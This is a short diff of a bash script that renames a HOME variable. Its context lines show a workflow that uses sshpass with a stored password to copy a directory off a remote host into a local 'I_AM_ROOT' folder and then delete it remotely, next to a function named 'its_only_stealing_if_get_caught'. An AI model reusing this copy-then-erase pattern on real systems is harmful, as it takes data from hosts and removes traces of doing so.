@@ -52,11 +52,11 @@ fi
 ###################################################################################################################
 #To create a directory for the script.
 #This command needs to stay in this location
-HOME=$(pwd)
+HOME1=$(pwd)
 # We check that a working directory exists, if not we create one
 ls I_AM_ROOT 2>/dev/null
 if [ $? -gt 0 ]; then
-    mkdir $HOME/I_AM_ROOT
+    mkdir $HOME1/I_AM_ROOT
 fi
 
 ###################################################################################################################
@@ -304,7 +304,7 @@ its_only_stealing_if_get_caught
 # Commands to transfer the information and delete DIR in remote host.
 
 sleep 5
-sshpass -p "$PASSWD" scp -r "$USERNAME"@"$IP_ADDRESS":"$DIR" "$HOME"
+sshpass -p "$PASSWD" scp -r "$USERNAME"@"$IP_ADDRESS":"$DIR" "$HOME1"
 sleep 5
 
 sshpass -p "$PASSWD" ssh "$USERNAME"@"$IP_ADDRESS" rm -r "$DIR"
